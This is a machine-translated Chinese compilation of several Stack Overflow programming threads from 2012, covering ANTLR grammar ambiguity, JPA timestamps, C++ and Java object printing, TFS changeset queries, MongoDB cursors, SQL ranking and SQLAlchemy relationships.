> 赞同：1
> 
> 时间：2012-04-26T17:21:57.530

您也可以在不使用正则表达式的情况下执行此操作！

```
$a = end(explode('</a>' , $playlist->description )); 
```

这将为您提供之后的一切`</a>`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-26T17:17:28.197

```
echo preg_replace('#.*?</a>\s*(.*)#', "$1", $playlist->description); 
```

干杯

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2015-04-11T17:15:54.733

我制作了一个删除 HTML 标签及其内容的函数：

功能：

```
<?php
function strip_tags_content($text, $tags = '', $invert = FALSE) {

  preg_match_all('/<(.+?)[\s]*\/?[\s]*>/si', trim($tags), $tags);
  $tags = array_unique($tags[1]);

  if(is_array($tags) AND count($tags) > 0) {
    if($invert == FALSE) {
      return preg_replace('@<(?!(?:'. implode('|', $tags) .')\b)(\w+)\b.*?>.*?</\1>@si', '', $text);
    }
    else {
      return preg_replace('@<('. implode('|', $tags) .')\b.*?>.*?</\1>@si', '', $text);
    }
  }
  elseif($invert == FALSE) {
    return preg_replace('@<(\w+)\b.*?>.*?</\1>@si', '', $text);
  }
  return $text;
}
?> 
```

示例文本：$text = '带标签的**示例文本';**

strip_tags($text) 的结果：带有标签的示例文本

strip_tags_content($text) 的结果：文本

strip_tags_content($text, ' **') 的结果：示例**文本

strip_tags_content($text, '', TRUE); 的结果 带有标签的文本

我希望有人有用:)**

# antlr - 为什么 Antlr 发现这个语法模棱两可？

> ID：10338122
> 
> 赞同：2
> 
> 时间：2012-04-26T17:08:25.530
> 
> 标签：antlr

我正在为 Java 的一个子集创建一个语法，并且似乎遇到了一个问题，即我的语法被 ANTLR 认为是模棱两可的（或者，我认为这至少是错误背后的原因）。

这是我语法的相关部分：

```
expr : (op=MINUS | op=NOT) expr exprPrime      -> ^(Expr $op expr exprPrime)
     | NEW ID OPEN_PAREN CLOSE_PAREN exprPrime -> ^(Expr NEW ID OPEN_PAREN CLOSE_PAREN exprPrime)
     | ID exprPrime                            -> ^(Expr ID exprPrime)
     | THIS exprPrime                          -> ^(Expr THIS exprPrime)
     | INTEGER exprPrime                       -> ^(Expr INTEGER exprPrime)
     | NULL exprPrime                          -> ^(Expr NULL exprPrime)
     | TRUE exprPrime                          -> ^(Expr TRUE exprPrime)
     | FALSE exprPrime                         -> ^(Expr FALSE exprPrime)
     | OPEN_PAREN expr CLOSE_PAREN exprPrime   -> ^(Expr OPEN_PAREN expr CLOSE_PAREN exprPrime)
     ;

// remove left recursion via exprPrime
exprPrime : (op=PLUS | op=MINUS | op=MULT | op=DIV | op=LT | op=LEQ | op=GT | op=GEQ | op=EQ | op=NEQ | op=AND | op=OR | op=NOT) expr exprPrime
               -> ^(ExprPrime $op expr exprPrime)
          | DOT ID OPEN_PAREN (expr (COMMA expr)*)? CLOSE_PAREN exprPrime
               -> ^(ExprPrime DOT ID OPEN_PAREN (expr (COMMA expr)*)? CLOSE_PAREN exprPrime)
          |    
               -> ^(Epsilon)
          ;

/*------------------------------------------------------------------
 * LEXER RULES
 *------------------------------------------------------------------*/

CLASS         : 'class'   ;
PUBLIC        : 'public'  ;
STATIC        : 'static'  ;
EXTENDS       : 'extends' ;
NEW           : 'new'     ;
THIS          : 'this'    ;
NULL          : 'null'    ;
IF            : 'if'      ;
ELSE          : 'else'    ;
WHILE         : 'while'   ;
MAIN          : 'main'    ;
TRUE          : 'true'    ;
FALSE         : 'false'   ;
RETURN        : 'return'  ;
SYSO          : 'System.out.println' ;

OPEN_BRACKET  : '{' ;
CLOSE_BRACKET : '}' ;
OPEN_SQUARE   : '[' ;
CLOSE_SQUARE  : ']' ;
OPEN_PAREN    : '(' ;
CLOSE_PAREN   : ')' ;

ASSIGN        : '=' ;
COMMA         : ',' ;
DOT           : '.' ;
SEMICOLON     : ';' ;

STRING_TYPE   : 'String'  ;
INTEGER_TYPE  : 'int'     ;
VOID_TYPE     : 'void'    ;
BOOLEAN_TYPE  : 'boolean' ;

PLUS          : '+'  ;
MINUS         : '-'  ;
MULT          : '*'  ;
DIV           : '/'  ;
LT            : '<'  ;
LEQ           : '<=' ;
GT            : '>'  ;
GEQ           : '>=' ;
EQ            : '==' ;
NEQ           : '!=' ;
AND           : '&&' ;
OR            : '||' ;
NOT           : '!'  ;

ID            : LETTER (LETTER | DIGIT)* ;
INTEGER       : (NON_ZERO_DIGIT DIGIT*) | ZERO ;

WHITESPACE    : ('\t' | ' ' | '\r' | '\n'| '\u000C')+ { $channel = HIDDEN; } ;
COMMENT       : (('/*' .* '*/') | ('//' .* '\n')) { $channel = HIDDEN; } ;

fragment ZERO            : '0' ;
fragment DIGIT           : '0'..'9' ;
fragment NON_ZERO_DIGIT  : '1'..'9' ;
fragment LETTER          : 'a'..'z' | 'A'..'Z' ; 
```

这是我在创建语法时遇到的错误：

```
warning(200): MiniJava.g:101:11: Decision can match input such as "NEQ" using multiple alternatives: 1, 3
As a result, alternative(s) 3 were disabled for that input
warning(200): MiniJava.g:101:11: Decision can match input such as "EQ" using multiple alternatives: 1, 3
As a result, alternative(s) 3 were disabled for that input
warning(200): MiniJava.g:101:11: Decision can match input such as "MULT" using multiple alternatives: 1, 3
As a result, alternative(s) 3 were disabled for that input
warning(200): MiniJava.g:101:11: Decision can match input such as "DIV" using multiple alternatives: 1, 3
As a result, alternative(s) 3 were disabled for that input
warning(200): MiniJava.g:101:11: Decision can match input such as "GEQ" using multiple alternatives: 1, 3
As a result, alternative(s) 3 were disabled for that input
warning(200): MiniJava.g:101:11: Decision can match input such as "NOT" using multiple alternatives: 1, 3
As a result, alternative(s) 3 were disabled for that input
warning(200): MiniJava.g:101:11: Decision can match input such as "LT" using multiple alternatives: 1, 3
As a result, alternative(s) 3 were disabled for that input
warning(200): MiniJava.g:101:11: Decision can match input such as "LEQ" using multiple alternatives: 1, 3
As a result, alternative(s) 3 were disabled for that input
warning(200): MiniJava.g:101:11: Decision can match input such as "DOT" using multiple alternatives: 2, 3
As a result, alternative(s) 3 were disabled for that input
warning(200): MiniJava.g:101:11: Decision can match input such as "OR" using multiple alternatives: 1, 3
As a result, alternative(s) 3 were disabled for that input
warning(200): MiniJava.g:101:11: Decision can match input such as "PLUS" using multiple alternatives: 1, 3
As a result, alternative(s) 3 were disabled for that input
warning(200): MiniJava.g:101:11: Decision can match input such as "AND" using multiple alternatives: 1, 3
As a result, alternative(s) 3 were disabled for that input
warning(200): MiniJava.g:101:11: Decision can match input such as "MINUS" using multiple alternatives: 1, 3
As a result, alternative(s) 3 were disabled for that input
warning(200): MiniJava.g:101:11: Decision can match input such as "GT" using multiple alternatives: 1, 3
As a result, alternative(s) 3 were disabled for that input 
```

行号都指向带有 exprPrime 定义的行（为简洁起见，我省略了它上面的大部分语法，如果我需要发布更多内容，请告诉我）。exprPrime 本身的创建是为了避免“expr”中的左递归。

知道如何更改语法以消除歧义吗？我不确定我什至理解歧义是什么。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-26T19:07:37.523

您的语法可以最小化以显示它的歧义：

```
grammar T;                          // line 1
                                    //      2
expr                                //      3 
 : MINUS expr exprPrime             //      4
 ;                                  //      5
                                    //      6
exprPrime                           //      7
 : MINUS expr exprPrime             //      8
 | // epsilon                       //      9
 ;                                  //      10
                                    //      11
MINUS   : '-';                      //      12
INTEGER : '0'..'9'+;                //      13 
```

从此语法生成解析器将导致以下警告：

```
[20:38:15] warning(200): T.g:8:2: 
Decision can match input such as "MINUS" using multiple alternatives: 1, 2

As a result, alternative(s) 2 were disabled for that input
[20:38:15] error(201): T.g:8:2: The following alternatives can never be matched: 2 
```

第一部分表明在语法的第 8 行，生成的解析器可以采用两个“路径”来匹配令牌`MINUS`（第 8 行和第 9 行的替代方案都匹配`MINUS`！）。这就是歧义（在你的语法中，还有很多很多）。第二部分通知您，由于这种歧义，生成的解析器将无法采用第二种选择（该路径被禁用）。

另一件事：通过在同一个备选方案中匹配所有运算符，您无法使`*`优先级高于`-`. 所有的右递归产生式都使语法难以理解。我会这样做：

```
// ...

tokens {
  UNARY_MINUS;
  PARAMS;
  INVOKE;
}

parse
 : expr EOF
 ;

expr
 : or_expr
 ;

or_expr
 : and_expr (OR^ and_expr)*
 ;

and_expr
 : rel_expr (AND^ rel_expr)*
 ;

rel_expr
 : eq_expr ((LT | GT | LEQ | GEQ)^ eq_expr)?
 ;

eq_expr
 : add_expr ((EQ | NEQ)^ add_expr)?
 ;

add_expr
 : mult_expr ((PLUS | MINUS)^ mult_expr)*
 ;

mult_expr
 : unary_expr ((MULT | DIV)^ unary_expr)*
 ;

unary_expr
 : MINUS atom -> ^(UNARY_MINUS atom)
 | atom
 ;

atom
 : NEW ID OPEN_PAREN params CLOSE_PAREN -> ^(NEW ID params)
 | (ID -> ID) (invoke -> ^(ID invoke))?
 | THIS
 | INTEGER
 | NULL
 | TRUE
 | FALSE 
 | OPEN_PAREN expr CLOSE_PAREN -> expr
 ;

invoke
 : DOT ID OPEN_PAREN params CLOSE_PAREN invoke? -> ^(INVOKE ID params invoke?)
 ;

params
 : (expr (COMMA expr)*)? -> ^(PARAMS expr*)
 ;
// ... 
```

没有歧义，所有运算符都有适当的优先级（`OR`最低，一元运算符最高（原子甚至更高，当然......））。`"x.foo(9,y)&&(1==2||true)+2+3+4==333"`像使用规则一样解析输入`expr`，将产生以下 AST：

![在此处输入图像描述](../Images/190ac95fb355d2b0246fd15388d7246f.png)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-26T17:30:38.357

歧义在于第三个替代方案`exprPrime`将匹配*任何东西*- 空规则总是成功并且永远不会推进输入。为了消除歧义，您可以从定义中删除该替代项，并将所有出现的 替换`exprPrime`为`exprPrime?`。

# mysql - JPA TIMESTAMP 自我更新

> ID：10338123
> 
> 赞同：0
> 
> 时间：2012-04-26T17:08:25.970
> 
> 标签：mysql, jpa, timestamp

我的 MySQL 数据库中有许多 TIMESTAMP 列。这是实体类的相关部分：

```
@Basic(optional = false)
@NotNull
@Column(name = "created_date")
@Temporal(TemporalType.TIMESTAMP)
private Date createdDate;
@Column(name = "last_activity_date")
@Temporal(TemporalType.TIMESTAMP)
private Date lastActivityDate;
@Column(name = "last_password_change_date")
@Temporal(TemporalType.DATE)
private Date lastPasswordChangeDate;
@Column(name = "password_reset_valid_until_date")
@Temporal(TemporalType.TIMESTAMP)
private Date passwordResetValidUntilDate; 
```

目前我正在处理“createdDate”部分，我的问题是每次我将任何内容保存到数据库中的该行时，它都会自动更新为新的 TIMESTAMP。如何防止这种情况发生，以便它只保留输入的原始值？

# java - 打印用户定义对象的方法

> ID：10338126
> 
> 赞同：0
> 
> 时间：2012-04-26T17:08:38.763
> 
> 标签：java, c++, object, printing

我很好奇打印用户定义对象的方式。我的意思是把对象打印到输出流。是否有可能让流类提供可以打印各种对象的方法，类似于 Java 中的 Object 类型如何为所有派生类提供 toString() 方法？我想一个问题是缺少能够从流类派生的类，因为在 Java 中的 Object 示例中，所有类都是 Object 的隐式子类。还有其他人吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-26T17:17:37.523

由于这是标记为 C++，因此这是一个 C++ 答案：

只是重载`std::ostream& operator<<(std::ostream&, const foo& f)`做这样的事情：

```
class foo {
  friend std::ostream& operator<<(std::ostream& os, const foo& f) {
    return os << f.x;
  }
  public:
    // ...
  private:
    int x;
};

int main() {
     foo myfoo;
     std::cout << "myfoo is " << myfoo << '\n';
} 
```

关于如何做到这一点，有更好的指南。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-26T17:10:44.033

覆盖该`toString()`函数并调用它。我不明白你怎么会有一个简单地打印各种对象的神级。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-26T17:29:01.093

稍微扩展 Pubby 的答案，您可以使该`operator<<`功能适用​​于所有流类型，只需稍作修改。这里还展示了如何流式*传输*.

```
class foo {
  //output works for all basic_ostreams
  template<class e, class t>
  friend std::basic_ostream<e,t>& 
        operator<<(std::basic_ostream<e,t>& os, const foo& f) 
  {
    return os << f.x;
  }
  //input is very similar.  Here's the differences:
  // istream instead of ostream
  // >> instead of <<
  // foo is not const
  template<class e, class t>
  friend std::basic_istream<e,t>& 
        operator>>(std::basic_istream<e,t>& is, foo& f) 
  {
    return os >> f.x;
  }
  public:
    // ...
  private:
    int x;
};

int main() {
     foo myfoo;
     std::cout << "enter foo: ";
     std::cin >> myfoo;
     std::cout << "myfoo is " << myfoo << '\n';
     std::wcout << L"myfoo is " << myfoo << L'\n';
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-26T17:11:12.220

不可能流式传输所有类型的对象。例如，您将如何流式传输线程？这意味着什么？

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-04-26T17:13:16.580

@Aidanc 答案可能有效。一切都取决于你想做什么。如果您想将对象字段打印到控制台，这就是解决方案。

但是，如果您想通过网络发送它们，而不需要任何人阅读流，请使用 ObjectOutputStream。它可以从一个流中写入（并且 ObjectInputstream 可以读取）对象，无论它是什么，无论是套接字还是文件。

几乎所有对象都可以通过这种方式发送，实现 Serializable 的人自己负责它们的序列化（将对象转换为 0 和 1 的序列），对于其他对象，您仍然可以使用 Externalizable Api。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-04-26T17:14:57.947

你想看两件事：

1.  Java 类对象
2.  Java反射的概念

基本上，两者的结合使您可以自省任何给定的对象，因此很容易想出一个通用的方法来打印您想要的对象。IE

```
String myClassName = "com.my.class.NameHere";
Class c = Class.forName(myClassName);
Method m[] = c.getDeclaredMethods();
for(Method method: m)
  System.out.println(method.toString()); 
```

# php - Doctrine MongoDB Bundle：“_id”是数组时的光标 toArray() 错误

> ID：10338130
> 
> 赞同：1
> 
> 时间：2012-04-26T17:09:11.647
> 
> 标签：php, mongodb, doctrine

由于 MapReduce，我有一个具有以下结构的 MongoDb 集合：

```
{ "_id" : { "id" : NumberLong(1), "date" : "04-26-2012" }, "value" : { "count" : 100 } } 
```

在我的控制器中，我正在执行以下操作以返回一个数组以显示结果：

```
$mongoDb         = $mongo->selectDatabase($dbname);        
$mongoCollection = $mongoDb->selectCollection($collname);
$qb              = $mongoCollection->createQueryBuilder(); 
$qb              = $qb->find();        
$resultCursor    = $qb->getQuery()->execute();
                                  ->limit(10);
$resultArray     = $resultCursor  ->toArray(); 
```

但是，我得到一个例外：“注意：在 vendor/doctrine-mongodb/lib/Doctrine/MongoDB/Cursor.php 第 154 行中的数组到字符串转换”

下面是 Cursor.php 的第 154 行。MongoCursor::key 不将“_id”作为数组处理吗？

```
/** @proxy */
public function key()
{
    return $this->mongoCursor->key();
} 
```

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-10-18T17:53:04.197

为了快速将 mongoDb 光标转换为数组，您可以使用[http://php.net/manual/en/function.iterator-to-array.php](http://php.net/manual/en/function.iterator-to-array.php)

```
$qb = $this->createQueryBuilder();

$qb->hydrate(false);

$query = $qb->getQuery();

$resultArray = iterator_to_array($query->execute()); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-26T17:56:56.977

key() 总是返回一个字符串（参见[http://php.net/manual/en/class.iterator.php](http://php.net/manual/en/class.iterator.php)），因此它会生成该通知，试图将数组转换为字符串形式。不过，这只是一个通知，它应该仍然有效。

解决这个问题的最简单方法可能就是不要在游标上调用 toArray()：而是迭代它 ( `foreach $resultCursor as $value) ...`)。

# wpf - Haskell 中 MVC 框架的镜头

> ID：10338131
> 
> 赞同：7
> 
> 时间：2012-04-26T17:09:12.213
> 
> 标签：wpf, model-view-controller, haskell

我一直在考虑如何在 WPF 或 AngularJS 的模具中在 Haskell 中构建 MVC 框架的想法，但似乎无法找到开始的关键类型或想法。所以不幸的是一个模糊的问题——还有其他人在考虑这个问题吗？

我看到了编辑镜头、多板和 Compos，但我认为它们都解决了略有不同的问题。

我对它如何工作的粗略草图是：

1.  将模型创建为普通的 haskell 数据结构
2.  创建一组“镜头”或命令来修改您的模型。
3.  编写一个由模型中的类型参数化的 HTML（或其他）模板。

.

```
data Model = Page { _title :: String, _content :: [(Int, String)] }

title :: Lens Model String
content :: Int -> Lens Model (Maybe String) 
```

然后我希望能够编写一个函数：

```
Model -> Template Model -> Html 
```

以及在应用镜头时更新部分视图的功能。

```
Lens Model a -> a -> HtmlTemplate Model -> [(Path, Html)] 
```

所以我想问题是 - 镜头将采用哪种类型，可以对一种数据结构进行操作，然后用于描述另一种数据结构的变化。

一种可能性似乎是创建一个包含所有镜头的 GADT，然后在 GADT 类型上对 HTML 进行模板化，然后可以在每个步骤中使用该模板与模板进行匹配。例如

```
data Lenses a b where
    Title :: Lens Model String -> Lenses Model String
    Item  :: Lens Model String -> Lenses Model (Maybe String) 
```

然后是 Html 模板数据类型，例如

```
data HtmlTemplate a = Text String 
              | Element String [Attrib a] 
              | forall b. Binding (Lenses a b) (Html b) 
```

Binding 元素可以直接与其进行模式匹配。

但这似乎几乎否定了这一点，因为模型然后在臀部与视图相连。

我想知道那里有没有人（比我聪明）考虑过这可能如何工作？或者即使这是个好主意？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-04-26T17:21:24.980

我一直在使用 Haskell 中基于镜头的“MVC”构建一个大型商业应用程序。

*   纯函数式数据结构
*   用于设置和获取（并保持数据一致）的镜头
*   用于生成与每个镜头相关的视图（模板）的 DSL。

这是一次很棒的体验，我绝对推荐复杂结构的详细结构编辑方法。

这种方法迫使你

*   不是破解，而是使用镜头作为内部模型的安全接口
*   模型->视图的强分离
*   对所有内容进行类型检查——生成视图代码的镜头类型

有很多方法可以设计它，但我认为这是一种非常合理的设计方法。您需要对 GUI 部分提供良好的 DSL 支持。

# sqlite - 如何调整终端中显示的 SQLITE 选择语句结果的列大小？

> ID：10338138
> 
> 赞同：0
> 
> 时间：2012-04-26T17:09:33.347
> 
> 标签：sqlite, cygwin

我在 Windows 上使用 Cygwin，当我向 sqlite 程序发送 SELECT 语句时，所有列分隔符（字符“ `|`”）都紧跟在值之后，而不是形成固定的列宽 a（“网格样式”）结果。

我已经尝试过该`.width`命令，但它根本不起作用。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-26T18:25:09.363

```
"I've already tried the .width command, but it didn't worked at all." 
```

`.width NUM1 NUM2 ...`设置后使用了`.mode columns`吗？

# java - 从静态方法的鼠标侦听器修改全局定义的静态变量

> ID：10338147
> 
> 赞同：1
> 
> 时间：2012-04-26T17:10:21.030
> 
> 标签：java, static, global-variables, static-methods

我正在尝试修改以下全局定义的变量：

```
static int players; 
```

从以下方法：

```
public static void selectPlayers() {

    JButton player1 = new JButton("1 Player");
    player1.addMouseListener(new MouseAdapter() {
        public void mousePressed(MouseEvent arg0) {
            players = 1;
        }
    });
} 
```

这对变量没有影响。该变量是全局变量，因此可以从 main 方法访问它。修改变量的最佳方法是什么？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-26T17:20:06.853

如果我没记错的话，玩家是一种属性而不是一种方法。并且访问静态属性必须通过他的班级名称

```
public Class1{

 static int players;

 public static void selectPlayers() {

   JButton player1 = new JButton("1 Player");
   player1.addMouseListener(new MouseAdapter() {
     public void mousePressed(MouseEvent arg0) {
        Class1.players = 1;
    }
 });
 }
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-26T17:27:22.200

要访问正确的`players`变量，您需要在其正确的位置调用它，换句话说，无论它是在哪个类中定义的。

如果它在同一个班级，请致电`this.players = 1`. 如果它在另一个班级，你应该打电话给`className.players = 1`. 如果您的代码编译，则意味着您正在修改同一类中的局部变量或全局变量，而您需要的变量在另一个类中。

# tfs - 使用 TFS TF History 确定最新的变更集

> ID：10338149
> 
> 赞同：7
> 
> 时间：2012-04-26T17:10:32.427
> 
> 标签：tfs, tf-cli

我正在编写一个脚本，该脚本仅在源代码发生更改时才运行构建。我需要知道自上次运行构建以来是否有变化。这曾经有效，因为文件夹不会被删除，因此很容易确定是否有更改，但现在每次运行构建时都会删除所有内容。我曾考虑使用 TFS TF 历史命令来查询最后一个变更集或最后两个变更集，但在仅解析输出中的变更集编号时遇到了问题。我也考虑过使用 changeset 命令。是否有任何命令行参数可用于回答问题，自日期或变更集编号以来是否发生了变化？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2015-04-24T08:21:59.667

对于没有本地工作空间的最新变更集编号，请使用以下命令：

```
tf history /collection:"http://server:8080/tfs/Collection" "$/Project" /recursive /stopafter:1 /noprompt /login:domain\user,password 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-02-04T20:47:27.820

摘自我要构建的批处理文件。

```
set _aPath="f:\TFS\a"
set _TFPath="c:\Program Files (x86)\Microsoft Visual Studio 10.0\Common7\IDE" 
```

...

```
pushd %_aPath%
%_TFPath%\TF.exe history . /r /noprompt /stopafter:1 /Version:W > temp
FOR /f "tokens=1" %%a in ('findstr /R "^[0-9][0-9]*" temp') do set _BuildVersion=10.3.0.%%a
del temp
popd 
```

使用临时文件，但效果很好。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-04-26T18:47:06.373

正如 Andrew 所提到的，TFS 具有内置的持续集成功能。但是，是的，从某个时间点开始查询变更集很容易，无论是日期还是变更集。您想查看该变更集与最新版本之间的历史记录：

```
tf history <folder> /version:C<changeset>~T /noprompt /recursive 
```

如果唯一的行输出是您查询的变更集，那么显然自签入以来没有任何更改。否则，您将看到额外的变更集，每行一个。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-12-05T07:13:54.683

有一个适配器可以集成 BuildForge 和 Microsoft Team Foundation Server。如果您有兴趣，这里是网址... [http://www-304.ibm.com/partnerworld/gsd/solutiondetails.do?&solution=46360&lc=en](http://www-304.ibm.com/partnerworld/gsd/solutiondetails.do?&solution=46360&lc=en)

> Automatra TFS Adapter for Rational Build Forge 提供持续集成 (CI) 和报告功能。
> 
> TFS 适配器进一步在 TFS 源（更改集）和工作项级别启用 CI 功能。开箱即用的报告可提供清晰的物料清单 (BOM) 报告，这些报告可以交付给构建的下游消费者。
> 
> 最后，您必须知道，Build Forge 的优势在于它能够将构建与部署（及其他）联系起来。显然，有了这些持续集成功能，您就可以继续使用我相信您希望实现的持续交付功能。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2014-06-24T12:38:59.277

我的 PowerShell 脚本被调用`GetVcsRevision.ps1`并位于 VCS Root 的子文件夹中：

```
param (
    [string]$PathToTF='C:\Program Files (x86)\Microsoft Visual Studio 12.0\Common7\IDE\TF.exe'
    ,[Parameter(Mandatory=$true)][string]$Login
    ,[Parameter(Mandatory=$true)][string]$Password
)
$result = &$PathToTF @("history","/stopafter:1","/recursive","..\*","/login:""$Login"",""$Password""") 2>&1 3>&1

if ($result.GetType().Name -eq "Object[]")
{
    <# $result format is:
        Changeset User              Date       Comment
        --------- ----------------- ---------- ----------------------------------------
        26038     user              24.06.2014 Sample commit comment

        $result[2] is:
        26038     user              24.06.2014 Sample commit comment

        $result[2].Split(" ")[0] is:
        26038
    #>

    $result[2].Split(" ")[0]
}
else
{
    "0"
} 
```

它正在将最后一个变更集编号发送到输出管道。如果出现问题，则此数字为`0`。

您可以从此脚本创建一个函数并在构建脚本中调用它。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2015-06-16T16:30:04.270

我的单行命令：

```
for /f "usebackq tokens=*" %%a in (`tf history . /recursive /noprompt /stopafter:1 /version:T ^| powershell -Command "$input | ? { $_ -imatch '^(\d+)\s+' } | %% { $matches[0].Trim() } | Select-Object -First 1"`) do set TIP_CHANGESET=%%a 
```

执行 TIP_CHANGESET 环境后。变量包含提示变更集

# css - @font-face 中的更多格式会决定更多的 http 请求吗？

> ID：10338152
> 
> 赞同：2
> 
> 时间：2012-04-26T17:10:39.693
> 
> 标签：css, font-face, page-load-time

考虑一个类似的 CSS 代码：

```
@font-face {
    font-family: 'MyFont';
    src: url('../fonts/MyFont.eot');
    src: local('Proxima'), url('../fonts/MyFont.woff') format('woff'), url('../fonts/MyFont.ttf') format('truetype'), url('../fonts/MyFont.svg') format('svg');
    font-weight: normal;
    font-style: normal;
} 
```

此代码是否确定了更多 HTTP 请求以下载所有格式，或者浏览器是否选择了最受支持的格式？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-26T17:13:19.057

不，浏览器会选择一种兼容的格式。随意添加尽可能多的来源:)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-26T17:16:34.917

不，只会使用一个。例如，您可以使用 firebug 或 google 控制台对其进行测试，并检查已发出的所有请求的列表（网络选项卡）

# mysql - 最接近下一个奖项的会员订购列表

> ID：10338155
> 
> 赞同：2
> 
> 时间：2012-04-26T17:10:46.503
> 
> 标签：mysql

我有两张表，一张'gift_limit_count'和一张'score'，如下所示：

**'gift_limit_count'** 包含：

gift_id
gift_limit
gift_amount

**“分数”**包含：

user_id 用户名
user_score

当用户的“user_score”计数达到下一个最高的“gift_limit”时，他们将获得“gift_amount”。我想做的是显示一个列表，比如最接近下一个奖项的前 10 名用户。

例如：

David(user_name) 在获得 40 英镑之前还有 1 分 (gift_amount)
Suzi 在获得 20 英镑之前
还有 2 分 Ian 在获得 40 英镑之前还有 2 分
Zack 在获得 40 英镑之前还有 3 分30 英镑
……

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-26T17:28:53.273

```
Select S.user_id, S.user_name, S.user_score
    , GLC.gift_limit, GLC.gift_amount
From    (
        Select S1.user_id
            , Min( GLC1.gift_limit ) As NextLimit
        From score As S1
            Join gift_limit_count As GLC1
                On GLC1.gift_limit > S1.user_score
        Group By S1.user_id
        ) As Z
    Join score As S
        On S.user_id = Z.user_id
    Join gift_limit_count As GLC
        On GLC.gift_limit = Z.NextLimit
Order By ( gift_limit - user_score )
Limit 10 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-26T17:20:55.870

您可能可以使用基于 min( score - gift_limit ) 的连接进行查询（分数 < gift_limit ），然后按每个人的最低值排序。将其分组以获得每人一个答案。

# python - 使用 SQLAlchemy，我如何建立动态关系？

> ID：10338156
> 
> 赞同：0
> 
> 时间：2012-04-26T17:10:47.510
> 
> 标签：python, synchronization, python-3.x, sqlalchemy

我有一个 SyncEntities 类（如下所示）。

我还有几个与 SyncEntities 类相关的其他类（例如 CommodityTypes 也在下面显示）。

我所有的 Base 子类都有这个专栏`uuidKey = Column(String, primary_key=True)`

假设 se 是 SyncEntities 的一个实例。se.entityKind 是 Base 子类的名称。

如何查询在 se.entityKind 类中筛选 se.uuidKey 的对象？

```
class SyncEntities(Base):
    __tablename__ = 'SyncEntities'

    uuidKey = Column(String, primary_key=True)
    dateCreated = Column(DateTime, index=True)
    dateModified = Column(DateTime, index=True)
    dateSynced = Column(DateTime, index=True)
    username = Column(String)
    entityKind = Column(String)
    deleted = Column(Boolean)

    def __init__(self, entity, security):
        self.uuidKey = newUUID()
        self.dateCreated = security.now
        self.dateModified = security.now
        self.dateSynced = security.then
        self.username = security.username
        self.entityKind = entity.__tablename__
        self.deleted = False

    def modified(self, security):
        self.dateModified = security.now
        self.username = security.username

class CommodityTypes(Base):
    __tablename__ = 'CommodityTypes'
    uuidKey = Column(String, ForeignKey('SyncEntities.uuidKey'), primary_key=True)
    myName = Column(String, unique = True)
    sortKey = Column(Integer, unique = True)

    mySyncEntity = relationship("SyncEntities")

    def __init__(self, security, myName, sortKey):
        self.syncEntity = SyncEntities(self, security)
        self.uuidKey = self.syncEntity.uuidKey
        self.myName = myName
        self.sortKey = sortKey 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-03T18:05:29.277

这里的结构与“多态关联”相似，但并不完全相同，您可以在此博客文章中阅读有关此模式的信息：http: [//techspot.zzzeek.org/2007/05/29/polymorphic-与 sqlalchemy/ 的关联](http://techspot.zzzeek.org/2007/05/29/polymorphic-associations-with-sqlalchemy/)。这是一篇旧文章，但[http://techspot.zzzeek.org/files/2007/discriminator_on_association.py](http://techspot.zzzeek.org/files/2007/discriminator_on_association.py)上的示例后来作为更新示例添加。

这种情况略有不同，因为像 CommodityTypes 这样的对象仅引用单个 SyncEntities，而不是通常的多态关联中的多个。SyncEntities 也只能引用单一类型的相关对象，因为您在本地有 entityKind。

我会注意到这种设计的一个潜在问题是，您可能在其他表中有一个 uuidKey 指向特定 SyncEntities 实例的行，但不是与“entityKind”匹配的类型。如果 CommodityTypes 和 SyncEntities 之间的关系实际上是一对一的，那会改变一切 - 这种模式实际上是简单的连接表继承，您可以使用[http://docs.sqlalchemy.org/en/rel_0_7/中描述的模式orm/inheritance.html](http://docs.sqlalchemy.org/en/rel_0_7/orm/inheritance.html)。

您也没有目标和 SyncEntities 之间的反向引用，这通常是自动化这些查找样式的一种方式。但是您仍然可以使用查找类的 entityKind 类型来近似事物：

```
def lookup_related(se):
    types = {
        'commodity':CommodityTypes,
        'foobar':FooBarTypes
    }
    cls = types[se.entityKind]
    session = object_session(se)
    return session.query(cls).filter(cls.mySyncEntity==se).all() 
```

这是一个也可以使用 backref 的 mixin：

```
class HasSyncEntity(object):
    entity_kind = None
    "subclasses need to populate this"

    @declared_attr
    def uuidKey(cls):
        return Column(String, ForeignKey("SyncEntities.uuidKey"), primary_key=True)

    @declared_attr
    def mySyncEntity(cls):
        return relationship("SyncEntities", backref="_%s_collection" % cls.entity_kind) 
```

CommodityTypes 变为：

```
class CommodityTypes(HasSyncEntity, Base):
    entity_kind = "commodity"
    # ... 
```

然后将这样的方法添加到 SyncEntities，它会查找适当的 backref，然后您就完成了：

```
def get_related(self):
    return getattr(self, "_%s_collection" % self.entityKind) 
```

# objective-c - 一个视图通过委托与另一个视图通信是否违反了 MVC？

> ID：10338158
> 
> 赞同：0
> 
> 时间：2012-04-26T17:10:52.643
> 
> 标签：objective-c, model-view-controller, view, delegates

